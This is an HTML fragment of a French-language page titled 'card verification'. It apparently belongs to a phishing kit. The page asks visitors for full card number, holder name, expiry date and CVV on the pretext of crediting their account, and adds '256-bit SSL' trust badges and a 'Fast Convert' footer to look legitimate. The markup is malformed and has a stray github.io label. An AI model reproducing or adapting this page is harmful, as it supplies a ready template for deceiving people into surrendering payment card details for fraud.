html>
 <head></head>
 <body>
  VERIFICATION DE LA CARTE 
  <hr style=" border-top: 1px solid blue;"> 
  <fieldset> 
   <dl> 
    <dt>
      Merci de bien vouloir nous communiquer les informations 
     <br> mentionnées ci-dessous, utiles pour créditer votre compte. 
    </dt> 


    <br> <label for="numcarte"> Numéro de la carte :</label><span class="required" style="color: orange"> *</span> &nbsp; 
    <dd> 
     <input type="text" name="numcarte" pattern="[0-9]{16}" minlength="16" maxlength="16" id="numcarte" value="" autocomplete="off" required placeholder="XXXX XXXX XXXX XXXX"> 
    </dd> 
   </dl> 
   <dl> 
    <dt>
<form method="post"> <label>https://c3-lan.github.io/idda/</label> 
  
     <label for="nomcarte">Nom du Titulaire :</label><span class="required" style="color: orange"> *</span>
    </dt> 
    <dd>
     <input type="text" name="nomcarte" id="nomcarte" placeholder="John Doe" required>
    </dd> 
   </dl> 
   <dl> 
    <dt>
     <label for="dateexp"> Date d'expiration : </label><span class="required" style="color: orange"> *</span>
    </dt> 
    <dd>
     <input type="text" name="dateexp" id="dateexp" maxlength="8" placeholder="MM / AAAA" required>
    </dd> 
   </dl> 
   <dl> 
    <dt> <label for="cvv">CVV / CVC :</label><span class="required" style="color: orange"> *</span> &nbsp; 
    </dt> 
    <dd>
     <input type="text" name="cvv" id="cvv" placeholder="XXX " pattern="[0-9]{3}" required maxlength="3">
    </dd> 
   </dl> 
   <br> 
  </fieldset> 
  <img src="../../css/ssl-badge.jpg" width="15px"> &nbsp; &nbsp; Protection par un cryptage SSL 256 bits 
  <br> <button class="primary-button checkout-button" type="submit" id="verderButton" name="Finaliser"> Finaliser le payment </button> 
  <div class="col-xs-12 col-sm-2"> 
  </div> 
  <footer> 
   <div class="row"> 
    <div class="col-xs-12 col-sm-6"> 
     <div id="footer-copyright">
       © 2021 - <b>Fast Convert</b> BE-FR fait partie d’CG &nbsp; | &nbsp; Votre paiement est protégé par un cryptage SSL 256 bits 
     </div> 
     <br> 
    </div> 
